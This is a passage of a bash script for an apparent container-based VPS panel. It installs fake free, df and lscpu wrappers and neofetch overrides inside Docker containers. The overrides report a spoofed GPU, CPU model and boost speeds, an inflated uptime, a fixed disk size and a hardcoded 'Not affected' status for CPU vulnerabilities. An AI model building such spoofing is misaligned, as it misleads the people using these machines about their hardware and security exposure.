                echo "vm.vfs_cache_pressure=50" >> /etc/sysctl.d/99-tasin-performance.conf
                echo "net.core.default_qdisc=fq" >> /etc/sysctl.d/99-tasin-performance.conf 2>/dev/null
                sysctl -p /etc/sysctl.d/99-tasin-performance.conf >/dev/null 2>&1

                # Unlimited journal rate (prevents log throttling delays)
                mkdir -p /etc/systemd/journald.conf.d
                printf "[Journal]\nRateLimitInterval=0\nRateLimitBurst=0\nMaxLevelStore=warning\n" > /etc/systemd/journald.conf.d/tasin.conf

                # Faster apt: parallel downloads, no install-recommends bloat
                mkdir -p /etc/apt/apt.conf.d
                printf "Acquire::Queue-Mode \\"host\\";\nAcquire::Languages \\"none\\";\nAPT::Install-Recommends \\"false\\";\nAPT::Install-Suggests \\"false\\";\nDpkg::Options {\\"--force-confdef\\";\\"--force-confold\\";};\n" > /etc/apt/apt.conf.d/99-tasin-fast
            ' 2>/dev/null
            log_msg "Performance tuning applied to $VM_NAME"
        fi

        # 3.6 CONTAINER-AWARE STATS (installed for ALL VMs by default)
        # Installs fake `free` and `df` wrappers + neofetch memory override so
        # that neofetch / free -h / df -h all show CONTAINER-level usage (the
        # actual RAM the Docker container is using, e.g. 700MB) instead of the
        # host's full RAM (e.g. 128GB). This is the DEFAULT behavior now — no
        # need to select "Fresh VPS Start" to get it.
        echo -e " ${BLUE}∞${NC} Configuring container-aware stats (free/df/neofetch)..."
        docker exec "$VM_NAME" mkdir -p /etc/tasin-spoof 2>/dev/null

        # Determine RAM limit in MB for ALL modes
        local _ram_mb
        if [ "$MODE" == "unlimited" ] || [ "$MODE" == "fresh" ] || [ -z "$RAM" ]; then
            # Unlimited / Fresh mode / no RAM set: use host's total RAM as the
            # container's "limit" (so neofetch/free show host total as the cap,
            # but actual usage comes from the container's cgroup)
            _ram_mb=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')
            [ -z "$_ram_mb" ] && _ram_mb=2048
        else
            _ram_mb=$(echo "$RAM" | tr -dc '0-9')
            local _ram_unit=$(echo "$RAM" | tr -dc 'a-zA-Z')
            case "$_ram_unit" in
                g|G) _ram_mb=$(( _ram_mb * 1024 ));;
                m|M) _ram_mb=$_ram_mb;;
                *)   _ram_mb=$(( _ram_mb * 1024 ));;
            esac
        fi
        [ -z "$_ram_mb" ] && _ram_mb=2048
        docker exec "$VM_NAME" bash -c "printf '%s\n' '$_ram_mb' > /etc/tasin-spoof/ram_limit_mb" 2>/dev/null

        # Determine CPU cores for display
        local _cores_for_display="${CORES:-}"
        if [ -z "$_cores_for_display" ]; then
            _cores_for_display=$(nproc 2>/dev/null)
            [ -z "$_cores_for_display" ] && _cores_for_display=1
        fi
        docker exec "$VM_NAME" bash -c "printf '%s\n' '$_cores_for_display' > /etc/tasin-spoof/cpu_cores" 2>/dev/null

        # ─── Fake `free` wrapper: shows container's own RAM limit + actual usage ───
        cat << 'FREE_EOF' > /tmp/_fake_free
#!/bin/bash
# TASIN fake free v3.4 — shows the container's OWN RAM usage (not host's)
RAM_LIMIT=2048
[ -f /etc/tasin-spoof/ram_limit_mb ] && RAM_LIMIT=$(cat /etc/tasin-spoof/ram_limit_mb 2>/dev/null | head -1 | tr -dc '0-9')
[ -z "$RAM_LIMIT" ] && RAM_LIMIT=2048

# Read real cgroup memory usage (in bytes) — this is what the container ACTUALLY uses
MEM_USAGE_B=0
if [ -f /sys/fs/cgroup/memory/memory.usage_in_bytes ]; then
    MEM_USAGE_B=$(cat /sys/fs/cgroup/memory/memory.usage_in_bytes 2>/dev/null | tr -dc '0-9')
elif [ -f /sys/fs/cgroup/memory.current ]; then
    MEM_USAGE_B=$(cat /sys/fs/cgroup/memory.current 2>/dev/null | tr -dc '0-9')
fi
[ -z "$MEM_USAGE_B" ] && MEM_USAGE_B=0
MEM_USAGE_MB=$(( MEM_USAGE_B / 1024 / 1024 ))
[ "$MEM_USAGE_MB" -gt "$RAM_LIMIT" ] && MEM_USAGE_MB=$RAM_LIMIT

MEM_FREE_MB=$(( RAM_LIMIT - MEM_USAGE_MB ))
[ "$MEM_FREE_MB" -lt 0 ] && MEM_FREE_MB=0
MEM_TOTAL_KB=$(( RAM_LIMIT * 1024 ))
MEM_USED_KB=$(( MEM_USAGE_MB * 1024 ))
MEM_FREE_KB=$(( MEM_FREE_MB * 1024 ))
MEM_AVAIL_KB=$MEM_FREE_KB

SWAP_TOTAL_KB=0
SWAP_USED_KB=0
SWAP_FREE_KB=0

if [ "$1" == "-h" ] || [ "$1" == "--human" ]; then
    human() {
        local kb=$1
        if [ "$kb" -ge 1048576 ]; then
            awk "BEGIN{printf \"%.1fGi\", $kb/1048576}"
        elif [ "$kb" -ge 1024 ]; then
            awk "BEGIN{printf \"%.0fMi\", $kb/1024}"
        else
            printf "%iKi" "$kb"
        fi
    }
    printf "               total        used        free      shared  buff/cache   available\n"
    printf "Mem:    %10s %10s %10s %10s %10s %10s\n" "$(human $MEM_TOTAL_KB)" "$(human $MEM_USED_KB)" "$(human $MEM_FREE_KB)" "0B" "0B" "$(human $MEM_AVAIL_KB)"
    printf "Swap:   %10s %10s %10s\n" "$(human $SWAP_TOTAL_KB)" "$(human $SWAP_USED_KB)" "$(human $SWAP_FREE_KB)"
else
    printf "              total        used        free      shared  buff/cache   available\n"
    printf "Mem:    %11i %11i %11i %11i %11i %11i\n" "$MEM_TOTAL_KB" "$MEM_USED_KB" "$MEM_FREE_KB" 0 0 "$MEM_AVAIL_KB"
    printf "Swap:   %11i %11i %11i\n" "$SWAP_TOTAL_KB" "$SWAP_USED_KB" "$SWAP_FREE_KB"
fi
FREE_EOF
        docker cp /tmp/_fake_free "$VM_NAME":/usr/local/bin/free
        docker exec "$VM_NAME" chmod +x /usr/local/bin/free 2>/dev/null
        rm -f /tmp/_fake_free

        # ─── Fake `df` wrapper: shows container's own disk usage ───
        cat << 'DF_EOF' > /tmp/_fake_df
#!/bin/bash
# TASIN fake df v3.4 — shows the container's own disk usage (not host's)
DISK_TOTAL_KB=$((50 * 1024 * 1024))   # 50 GB virtual disk
DISK_USED_KB=$(du -sk / 2>/dev/null | awk '{print $1}')
[ -z "$DISK_USED_KB" ] && DISK_USED_KB=0
[ "$DISK_USED_KB" -gt "$DISK_TOTAL_KB" ] && DISK_USED_KB=$DISK_TOTAL_KB
DISK_FREE_KB=$(( DISK_TOTAL_KB - DISK_USED_KB ))
USED_PCT=$(( DISK_USED_KB * 100 / DISK_TOTAL_KB ))
[ "$USED_PCT" -gt 100 ] && USED_PCT=100

if [ "$1" == "-h" ] || [ "$1" == "--human" ]; then
    human() {
        local kb=$1
        if [ "$kb" -ge 1048576 ]; then
            awk "BEGIN{printf \"%.1fG\", $kb/1048576}"
        elif [ "$kb" -ge 1024 ]; then
            awk "BEGIN{printf \"%.0fM\", $kb/1024}"
        else
            printf "%iK" "$kb"
        fi
    }
    printf "Filesystem      Size  Used Avail Use%% Mounted on\n"
    printf "tasin-disk     %5s %5s %5s  %3i%% /\n" "$(human $DISK_TOTAL_KB)" "$(human $DISK_USED_KB)" "$(human $DISK_FREE_KB)" "$USED_PCT"
else
    printf "Filesystem     1K-blocks    Used Available Use%% Mounted on\n"
    printf "tasin-disk    %10i %8i %10i  %3i%% /\n" "$DISK_TOTAL_KB" "$DISK_USED_KB" "$DISK_FREE_KB" "$USED_PCT"
fi
DF_EOF
        docker cp /tmp/_fake_df "$VM_NAME":/usr/local/bin/df
        docker exec "$VM_NAME" chmod +x /usr/local/bin/df 2>/dev/null
        rm -f /tmp/_fake_df

        # Ensure /usr/local/bin is first in PATH (so our wrappers take priority)
        docker exec "$VM_NAME" bash -c "grep -q 'usr/local/bin' /etc/profile 2>/dev/null || echo 'export PATH=/usr/local/bin:\$PATH' >> /etc/profile" 2>/dev/null

        log_msg "Container-aware stats configured for $VM_NAME (RAM limit=${_ram_mb}MB, CPU=${CORES:-1} cores)"
        echo -e " ${GREEN}✔ Container-aware stats active — free/neofetch show container's own RAM${NC}"

        # 4. Apply Network Speed Limit
        if [ -n "$NET_SPEED" ]; then
            echo -e " ${BLUE}∞${NC} Applying network speed limit..."
            # Ensure iproute2 (tc) is installed first
            docker exec "$VM_NAME" bash -c "
                if ! command -v tc >/dev/null 2>&1; then
                    apt-get update -qq && apt-get install -y -qq iproute2 >/dev/null 2>&1
                    apk add iproute2 >/dev/null 2>&1
                fi
            " 2>/dev/null
            # Detect network interface inside container
            C_IFACE=$(docker exec "$VM_NAME" bash -c 'ip route 2>/dev/null | awk "/default/ {print \$5}" | head -1' 2>/dev/null)
            [ -z "$C_IFACE" ] && C_IFACE=eth0
            # Apply tc rules using detected interface
            docker exec "$VM_NAME" bash -c "
                tc qdisc del dev $C_IFACE root 2>/dev/null
                tc qdisc add dev $C_IFACE root handle 1: htb default 10
                tc class add dev $C_IFACE parent 1: classid 1:10 htb rate ${NET_SPEED}mbit ceil ${NET_SPEED}mbit burst 15k cburst 15k
                tc qdisc add dev $C_IFACE parent 1:10 handle 10: sfq perturb 10
            " 2>/dev/null

            # Create persistence script for container restarts
            cat > /tmp/_speed_limit.sh << 'SPEEDLIMEOF'
#!/bin/bash
sleep 2
if command -v tc >/dev/null 2>&1; then
    IFACE=$(ip route 2>/dev/null | awk '/default/ {print $5}' | head -1)
    [ -z "$IFACE" ] && IFACE=eth0
    SPEED=$(cat /root/.speed_limit_value 2>/dev/null)
    [ -z "$SPEED" ] && exit 0
    tc qdisc del dev $IFACE root 2>/dev/null
    tc qdisc add dev $IFACE root handle 1: htb default 10
    tc class add dev $IFACE parent 1: classid 1:10 htb rate ${SPEED}mbit ceil ${SPEED}mbit burst 15k cburst 15k
    tc qdisc add dev $IFACE parent 1:10 handle 10: sfq perturb 10
fi
SPEEDLIMEOF
            docker cp /tmp/_speed_limit.sh "$VM_NAME":/usr/local/bin/apply_speed_limit.sh
            docker exec "$VM_NAME" chmod +x /usr/local/bin/apply_speed_limit.sh
            rm -f /tmp/_speed_limit.sh

            # Add to profile.d (runs on every login / docker exec)
            docker exec "$VM_NAME" bash -c "mkdir -p /etc/profile.d && echo '#!/bin/bash' > /etc/profile.d/speed_limit.sh && echo '/usr/local/bin/apply_speed_limit.sh >/dev/null 2>&1 &' >> /etc/profile.d/speed_limit.sh && chmod +x /etc/profile.d/speed_limit.sh"

            # For full VM containers, create a systemd one-shot service
            if [ "$IS_FULL" = true ]; then
                docker exec "$VM_NAME" bash -c "
                    cat > /etc/systemd/system/speed-limit.service << SLEOF
[Unit]
Description=Apply Network Speed Limit
After=network.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/apply_speed_limit.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
SLEOF
                    systemctl enable speed-limit.service >/dev/null 2>&1
                "
            fi

            # Save speed config for re-apply on reboot from manage menu
            echo "$NET_SPEED" > "/root/.tasin/vms/${VM_ID_NAME}/speed.info"
            # Also save inside container for persistence script
            docker exec "$VM_NAME" bash -c "echo ${NET_SPEED} > /root/.speed_limit_value" 2>/dev/null

            echo -e " ${GREEN}✔ Speed limited to ${NET_SPEED}Mbps${NC}"
        fi

        # 5. Apply Neofetch Config + Model Name patches + GPU spoof
        echo -e " ${BLUE}∞${NC} Finalizing system configuration..."
        # Ensure neofetch is available (install if not present)
        if ! docker exec "$VM_NAME" test -f /usr/bin/neofetch 2>/dev/null; then
            docker exec "$VM_NAME" bash -c "apt-get update -qq && apt-get install -y -qq neofetch pciutils >/dev/null 2>&1" 2>/dev/null
            docker exec "$VM_NAME" bash -c "apk add --no-cache neofetch pciutils 2>/dev/null" 2>/dev/null
        fi

        # ========================================
        # NEOFETCH CONFIG FILE (official override method)
        # neofetch sources ~/.config/neofetch/config.conf
        # AFTER defining all internal functions, so our
        # overrides here are guaranteed to take effect.
        #
        # v3.1: Rewritten to be ROBUST —
        #   * get_host() reads from /etc/tasin-spoof/product_name (no escaping issues)
        #   * get_uptime() is DYNAMIC (real container uptime + offset, grows naturally)
        #   * Clean heredoc generation = no syntax errors
        # ========================================

        # --- Copy host/model name files into container (for get_host to read) ---
        if [ -n "$MODEL_NAME" ]; then
            docker exec "$VM_NAME" mkdir -p /etc/tasin-spoof 2>/dev/null
            docker cp "$DMI_PRODUCT_FILE" "$VM_NAME":/etc/tasin-spoof/product_name 2>/dev/null
            docker cp "$DMI_VENDOR_FILE" "$VM_NAME":/etc/tasin-spoof/sys_vendor 2>/dev/null
        fi

        # --- Determine uptime offset for the dynamic get_uptime() ---
        # SYSTEM mode: use host's current uptime as offset (fake_uptime ≈ real host uptime, grows naturally)
        # FAKE mode: use the user-specified seconds as offset (starts at value, grows naturally)
        UPTIME_OFFSET="60"
        if [ "$FAKE_UPTIME_SEC" == "SYSTEM" ]; then
            UPTIME_OFFSET=$(awk 'BEGIN{printf "%.0f", '"$(cat /proc/uptime 2>/dev/null | awk '{print $1}')"'}' 2>/dev/null)
            [ -z "$UPTIME_OFFSET" ] && UPTIME_OFFSET="60"
        elif [ -n "$FAKE_UPTIME_SEC" ]; then
            UPTIME_OFFSET="$FAKE_UPTIME_SEC"
        fi
        # Ensure offset is purely numeric
        UPTIME_OFFSET=$(echo "$UPTIME_OFFSET" | tr -dc '0-9')
        [ -z "$UPTIME_OFFSET" ] && UPTIME_OFFSET="60"

        # Write the offset file inside the container (read by both uptime wrapper AND neofetch)
        docker exec "$VM_NAME" bash -c "echo '${UPTIME_OFFSET}' > /root/.fake_uptime_offset" 2>/dev/null
        # Write the hosting name inside the container (fallback for get_host if no model name set)
        docker exec "$VM_NAME" bash -c "printf '%s\n' '${HOSTING_NAME:-MinePanel}' > /etc/tasin-spoof/hosting_name" 2>/dev/null

        # --- Generate the neofetch config using a single heredoc (clean, valid bash) ---
        # The get_host function reads from /etc/tasin-spoof/product_name (avoids escaping issues)
        # The get_uptime function is DYNAMIC (computes real container uptime + offset on each run)
        cat > /tmp/_neofetch_conf << 'NEOFETCH_CONF_EOF'
# TASIN Neofetch Config v3.1 - Dynamic overrides
# Auto-generated by TASIN VPS Control Panel
# This file is valid bash — sourced by neofetch after its own functions are defined.

# Override get_host: show custom BIOS/Model name from /etc/tasin-spoof/product_name
# Falls back to the hosting name (e.g. "MinePanel") if no model name was set.
get_host() {
    host=""
    if [ -f /etc/tasin-spoof/product_name ]; then
        host="$(cat /etc/tasin-spoof/product_name 2>/dev/null | head -1 | tr -d '\r\n')"
    fi
    if [ -z "$host" ] && [ -f /etc/tasin-spoof/hosting_name ]; then
        host="$(cat /etc/tasin-spoof/hosting_name 2>/dev/null | head -1 | tr -d '\r\n')"
    fi
    if [ -z "$host" ]; then
        host="MinePanel"
    fi
}

# Override get_resolution: show a VPS resolution (since containers have no display)
get_resolution() {
    resolution="1920x1080"
}

# Override get_uptime: dynamic — real container uptime + offset (grows naturally like a real VM)
get_uptime() {
    local offset=60
    if [ -f /root/.fake_uptime_offset ]; then
        offset=$(cat /root/.fake_uptime_offset 2>/dev/null | head -1 | tr -dc '0-9')
    fi
    [ -z "$offset" ] && offset=60
    local real_sec=$(ps -p 1 -o etimes= 2>/dev/null | awk '{print $1}' | tr -dc '0-9')
    [ -z "$real_sec" ] && real_sec=0
    local total=$(( real_sec + offset ))
    local d=$(( total / 86400 ))
    local rem=$(( total % 86400 ))
    local h=$(( rem / 3600 ))
    local m=$(( (rem % 3600) / 60 ))
    uptime=""
    if [ "$d" -gt 0 ]; then
        [ "$d" -eq 1 ] && uptime="${uptime}${d} day, " || uptime="${uptime}${d} days, "
    fi
    if [ "$h" -gt 0 ] || [ "$d" -gt 0 ]; then
        if [ "$h" -eq 1 ]; then
            uptime="${uptime}1 hour, "
        else
            uptime="${uptime}${h} hours, "
        fi
    fi
    if [ "$m" -eq 1 ]; then
        uptime="${uptime}1 minute"
    else
        uptime="${uptime}${m} minutes"
    fi
}
NEOFETCH_CONF_EOF

        # --- GPU override (appended only if GPU spoof is set) ---
        if [ -n "$GPU_SPOOF_NAME" ]; then
            # Escape special chars for safe embedding in a bash double-quoted string
            local esc_gpu_name
            esc_gpu_name=$(printf '%s' "$GPU_SPOOF_NAME" | sed 's/\\/\\\\/g; s/"/\\"/g; s/`/\\`/g; s/\$/\\$/g')
            cat >> /tmp/_neofetch_conf << GPU_CONF_EOF

# Override get_gpu: show spoofed NVIDIA GPU
get_gpu() {
    gpu="${esc_gpu_name} [${GPU_SPOOF_VRAM}MB]"
    gpu_brand="NVIDIA"
}
get_gpu_legacy() { :; }
GPU_CONF_EOF
        fi

        # --- Memory override: shows the CONTAINER's own RAM usage (not host's) ---
        # neofetch's default get_memory() reads /proc/meminfo which shows host RAM.
        # This override reads cgroup memory usage so neofetch displays e.g.
        # "Memory: 700MiB / 2048MiB" (container's real usage) instead of
        # "Memory: 32GiB / 128GiB" (host's full RAM).
        cat >> /tmp/_neofetch_conf << 'MEM_CONF_EOF'

# Override get_memory: show container's own RAM (cgroup usage + RAM limit)
get_memory() {
    local ram_limit=2048
    if [ -f /etc/tasin-spoof/ram_limit_mb ]; then
        ram_limit=$(cat /etc/tasin-spoof/ram_limit_mb 2>/dev/null | head -1 | tr -dc '0-9')
    fi
    [ -z "$ram_limit" ] && ram_limit=2048

    # Read real cgroup memory usage (bytes)
    local mem_usage_b=0
    if [ -f /sys/fs/cgroup/memory/memory.usage_in_bytes ]; then
        mem_usage_b=$(cat /sys/fs/cgroup/memory/memory.usage_in_bytes 2>/dev/null | tr -dc '0-9')
    elif [ -f /sys/fs/cgroup/memory.current ]; then
        mem_usage_b=$(cat /sys/fs/cgroup/memory.current 2>/dev/null | tr -dc '0-9')
    fi
    [ -z "$mem_usage_b" ] && mem_usage_b=0

    local mem_usage_mb=$(( mem_usage_b / 1024 / 1024 ))
    [ "$mem_usage_mb" -gt "$ram_limit" ] && mem_usage_mb=$ram_limit

    # Format as neofetch expects: "XXXMiB / YYYMiB"
    if [ "$mem_usage_mb" -ge 1024 ]; then
        local used_gi=$(awk "BEGIN{printf \"%.1f\", $mem_usage_mb/1024}")
        local total_gi=$(awk "BEGIN{printf \"%.1f\", $ram_limit/1024}")
        mem="${used_gi}GiB / ${total_gi}GiB"
    else
        mem="${mem_usage_mb}MiB / ${ram_limit}MiB"
    fi
}
MEM_CONF_EOF

        # --- Terminal + CPU GHz override ---
        # Force Terminal to show "sshx" (or the current TERM program)
        # Force CPU to display "@ X.XXXGHz" format (neofetch default uses MHz sometimes)
        cat >> /tmp/_neofetch_conf << 'TERM_CPU_EOF'

# Override get_term: show the terminal program (sshx / bash / etc.)
get_term() {
    term="sshx"
    # If sshx isn't the parent, fall back to the parent process name
    if [ -n "$SSH_CONNECTION" ] || [ -n "$SSH_TTY" ]; then
        term="ssh"
    fi
}

# Override get_cpu: format CPU speed as GHz (e.g. "@ 5.050GHz")
get_cpu() {
    local cpu_vendor=""
    local cpu_model=""
    local cpu_mhz=""
    [ -f /etc/tasin-spoof/cpu_name ] && cpu_model=$(cat /etc/tasin-spoof/cpu_name 2>/dev/null | head -1 | tr -d '\r\n')
    [ -f /etc/tasin-spoof/cpu_mhz ]  && cpu_mhz=$(cat /etc/tasin-spoof/cpu_mhz 2>/dev/null | head -1 | tr -dc '0-9.')
    [ -z "$cpu_model" ] && cpu_model=$(grep -m1 '^model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//')
    [ -z "$cpu_mhz" ]   && cpu_mhz=$(grep -m1 '^cpu MHz' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//')

    # Strip the "(R)" / "(TM)" artifacts for cleaner display
    cpu_model="${cpu_model//(R)/}"
    cpu_model="${cpu_model//(TM)/}"
    cpu_model="${cpu_model//  / }"

    # Count cores
    local cores=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null)
    [ -z "$cores" ] && cores=1

    # Convert MHz → GHz (3 decimal places)
    local ghz=""
    if [ -n "$cpu_mhz" ]; then
        ghz=$(awk "BEGIN{printf \"%.3f\", ${cpu_mhz}/1000}")
    fi

    if [ -n "$ghz" ]; then
        cpu="${cpu_model} (${cores}) @ ${ghz}GHz"
    else
        cpu="${cpu_model} (${cores})"
    fi

    # Set brand for logo
    if grep -qi 'AuthenticAMD' /proc/cpuinfo 2>/dev/null; then
        cpu_brand="AMD"
    else
        cpu_brand="Intel"
    fi
}
get_cpu_legacy() { :; }
TERM_CPU_EOF

        # --- Override print_info to include Host, Terminal, Resolution, etc. ---
        # neofetch's default print_info doesn't always show Host. This override
        # explicitly lists every info line in the order the user wants.
        cat >> /tmp/_neofetch_conf << 'PRINT_INFO_EOF'

# Override print_info: control exactly which lines appear and in what order
print_info() {
    info title
    info underline
    info "OS" distro
    info "Host" host
    info "Kernel" kernel
    info "Uptime" uptime
    info "Packages" packages
    info "Shell" shell
    info "Resolution" resolution
    info "Terminal" term
    info "CPU" cpu
    info "GPU" gpu
    info "Memory" memory
    info "IP" local_ip
    info "Locale" locale
    info cols
}
PRINT_INFO_EOF

        # Deploy config file into container at ~/.config/neofetch/config.conf
        docker exec "$VM_NAME" mkdir -p /root/.config/neofetch 2>/dev/null
        docker cp /tmp/_neofetch_conf "$VM_NAME":/root/.config/neofetch/config.conf
        docker exec "$VM_NAME" chmod 644 /root/.config/neofetch/config.conf 2>/dev/null
        rm -f /tmp/_neofetch_conf

        # Clean up any old TASIN patches from /usr/bin/neofetch (from previous VM versions)
        docker exec "$VM_NAME" bash -c '
            NEO=/usr/bin/neofetch
            [ ! -f "$NEO" ] && exit 0
            sed -i "/## TASIN_HOST_START ##/,/## TASIN_HOST_END ##/d" "$NEO" 2>/dev/null
            sed -i "/## TASIN_UPTIME_START ##/,/## TASIN_UPTIME_END ##/d" "$NEO" 2>/dev/null
            sed -i "/## TASIN_GPU_START ##/,/## TASIN_GPU_END ##/d" "$NEO" 2>/dev/null
        ' 2>/dev/null

        # ========================================
        # FAKE lscpu WRAPPER (fixes "lscpu is glitched")
        # The real lscpu reads from sysfs (/sys/devices/system/cpu/) which shows
        # the HOST CPU, not the spoofed one. This wrapper parses /proc/cpuinfo
        # (which IS spoofed via the bind mount) and outputs in lscpu format.
        # Also saves CPU info to /etc/tasin-spoof/ for tools that check DMI.
        # ========================================
        if [ "$USE_SPOOF" = true ]; then
            # Save CPU spoof values inside the container for the fake lscpu to read
            docker exec "$VM_NAME" mkdir -p /etc/tasin-spoof 2>/dev/null
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$V_ID' > /etc/tasin-spoof/cpu_vendor" 2>/dev/null
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$C_NAME' > /etc/tasin-spoof/cpu_name" 2>/dev/null
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$C_MHZ' > /etc/tasin-spoof/cpu_mhz" 2>/dev/null
            # Save base + boost speeds so the fake lscpu can show BOTH
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$C_BASE_MHZ' > /etc/tasin-spoof/cpu_base_mhz" 2>/dev/null
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$C_BOOST_MHZ' > /etc/tasin-spoof/cpu_boost_mhz" 2>/dev/null
            # Save whether boost is enabled (1=yes, 0=no)
            local _boost_flag=0
            if [[ "$boost_yes" == "y" ]]; then _boost_flag=1; fi
            docker exec "$VM_NAME" bash -c "printf '%s\n' '$_boost_flag' > /etc/tasin-spoof/cpu_boost_enabled" 2>/dev/null

            # Build the fake lscpu wrapper on the host, then copy into container
            cat << 'LSCPU_EOF' > /tmp/_fake_lscpu
#!/bin/bash
# TASIN fake lscpu v3.3 — reads spoofed /proc/cpuinfo + /etc/tasin-spoof/
# Shows BASE SPEED and BOOST SPEED (when boost is enabled) so the user
# can verify their clock speed boost choice is active.

# Read from spoof files (written by TASIN panel)
VENDOR=""
MODEL=""
MHZ=""
BASE_MHZ=""
BOOST_MHZ=""
BOOST_EN=0
[ -f /etc/tasin-spoof/cpu_vendor ] && VENDOR=$(cat /etc/tasin-spoof/cpu_vendor 2>/dev/null | head -1 | tr -d '\r\n')
[ -f /etc/tasin-spoof/cpu_name ]   && MODEL=$(cat /etc/tasin-spoof/cpu_name 2>/dev/null | head -1 | tr -d '\r\n')
[ -f /etc/tasin-spoof/cpu_mhz ]    && MHZ=$(cat /etc/tasin-spoof/cpu_mhz 2>/dev/null | head -1 | tr -d '\r\n')
[ -f /etc/tasin-spoof/cpu_base_mhz ]  && BASE_MHZ=$(cat /etc/tasin-spoof/cpu_base_mhz 2>/dev/null | head -1 | tr -d '\r\n')
[ -f /etc/tasin-spoof/cpu_boost_mhz ] && BOOST_MHZ=$(cat /etc/tasin-spoof/cpu_boost_mhz 2>/dev/null | head -1 | tr -d '\r\n')
[ -f /etc/tasin-spoof/cpu_boost_enabled ] && BOOST_EN=$(cat /etc/tasin-spoof/cpu_boost_enabled 2>/dev/null | head -1 | tr -d '\r\n')

# Fallback: parse /proc/cpuinfo (spoofed via bind mount)
[ -z "$VENDOR" ] && VENDOR=$(grep -m1 '^vendor_id' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//')
[ -z "$MODEL" ]  && MODEL=$(grep -m1 '^model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//')
[ -z "$MHZ" ]    && MHZ=$(grep -m1 '^cpu MHz' /proc/cpuinfo 2>/dev/null | cut -d: -f2 | sed 's/^ *//')
[ -z "$BASE_MHZ" ]  && BASE_MHZ="$MHZ"
[ -z "$BOOST_MHZ" ] && BOOST_MHZ="$MHZ"

# Convert MHz → GHz for nicer display
base_ghz=$(awk "BEGIN{printf \"%.2f\", ${BASE_MHZ}/1000}" 2>/dev/null)
boost_ghz=$(awk "BEGIN{printf \"%.2f\", ${BOOST_MHZ}/1000}" 2>/dev/null)
cur_ghz=$(awk "BEGIN{printf \"%.2f\", ${MHZ}/1000}" 2>/dev/null)

# Count cores from /proc/cpuinfo
CORES=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null)
[ -z "$CORES" ] && CORES=1
SOCKETS=1
CORES_PER_SOCKET=$CORES
THREADS_PER_CORE=1

# Virtualization type
VIRT="VT-x"
[ "$VENDOR" == "AuthenticAMD" ] && VIRT="AMD-V"

# Handle --help
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
    echo "Usage: lscpu [options]"
    echo "Display information about the CPU architecture."
    exit 0
fi

# Handle JSON output (-J)
if [ "$1" == "-J" ] || [ "$1" == "--json" ]; then
    cat << JSONEOF
{
   "lscpu": [
      {"field": "Architecture:", "data": "x86_64"},
      {"field": "CPU op-mode(s):", "data": "32-bit, 64-bit"},
      {"field": "Byte Order:", "data": "Little Endian"},
      {"field": "Address sizes:", "data": "46 bits physical, 48 bits virtual"},
      {"field": "CPU(s):", "data": "$CORES"},
      {"field": "On-line CPU(s) list:", "data": "0-$((CORES-1))"},
      {"field": "Vendor ID:", "data": "$VENDOR"},
      {"field": "Model name:", "data": "$MODEL"},
      {"field": "CPU family:", "data": "6"},
      {"field": "Model:", "data": "158"},
      {"field": "Thread(s) per core:", "data": "$THREADS_PER_CORE"},
      {"field": "Core(s) per socket:", "data": "$CORES_PER_SOCKET"},
      {"field": "Socket(s):", "data": "$SOCKETS"},
      {"field": "Stepping:", "data": "10"},
      {"field": "CPU base MHz:", "data": "$BASE_MHZ"},
      {"field": "CPU max MHz:", "data": "$MHZ"},
      {"field": "CPU min MHz:", "data": "800.0000"},
      {"field": "BogoMIPS:", "data": "$MHZ"},
      {"field": "Virtualization:", "data": "$VIRT"},
      {"field": "Hypervisor vendor:", "data": "KVM"},
      {"field": "Virtualization type:", "data": "full"},
      {"field": "L1d cache:", "data": "48 KiB"},
      {"field": "L1i cache:", "data": "32 KiB"},
      {"field": "L2 cache:", "data": "2 MiB"},
      {"field": "L3 cache:", "data": "32 MiB"}
   ]
}
JSONEOF
    exit 0
fi

# Handle --parse / -p (extract specific fields)
if [ "$1" == "-p" ] || [ "$1" == "--parse" ]; then
    # Default parseable output: CPU,Core,Socket,Node
    for ((i=0; i<CORES; i++)); do
        echo "$i,$i,0,0"
    done
    exit 0
fi

# Default: pretty output (categorized like real lscpu)
# CPU boost MHz line is ONLY shown when boost is enabled (y)
echo "Architecture:        x86_64"
echo "CPU op-mode(s):      32-bit, 64-bit"
echo "Byte Order:          Little Endian"
echo "Address sizes:       46 bits physical, 48 bits virtual"
echo "CPU(s):              $CORES"
echo "On-line CPU(s) list: 0-$((CORES-1))"
echo "Vendor ID:           $VENDOR"
echo "BIOS Model name:     $MODEL"
echo "CPU family:          6"
echo "Model:               158"
echo "Thread(s) per core:  $THREADS_PER_CORE"
echo "Core(s) per socket:  $CORES_PER_SOCKET"
echo "Socket(s):           $SOCKETS"
echo "Stepping:            10"
echo "CPU(s) scaling MHz:  $MHZ"
echo "CPU base MHz:        $BASE_MHZ"
if [ "$BOOST_EN" == "1" ]; then
    echo "CPU boost MHz:       $BOOST_MHZ"
fi
echo "CPU max MHz:         $MHZ"
echo "CPU min MHz:         800.0000"
echo "BogoMIPS:            $MHZ"
echo ""
echo "Virtualization features:"
echo "  Virtualization:      $VIRT"
echo "  Hypervisor vendor:   KVM"
echo "  Virtualization type: full"
echo ""
echo "Caches (sum of all):"
echo "  L1d cache:           48 KiB ($CORES instances)"
echo "  L1i cache:           32 KiB ($CORES instances)"
echo "  L2 cache:            2 MiB ($CORES instances)"
echo "  L3 cache:            32 MiB (1 instance)"
echo ""
echo "NUMA:"
echo "  NUMA node(s):        1"
echo "  NUMA node0 CPU(s):   0-$((CORES-1))"
echo ""
echo "Vulnerabilities:"
echo "  Gather data sampling:   Not affected"
echo "  Itlb multihit:          Not affected"
echo "  L1tf:                   Not affected"
echo "  Mds:                    Not affected"
echo "  Meltdown:               Not affected"
echo "  Mmio stale data:        Not affected"
echo "  Retbleed:               Not affected"
echo "  Spec rstack overflow:   Not affected"
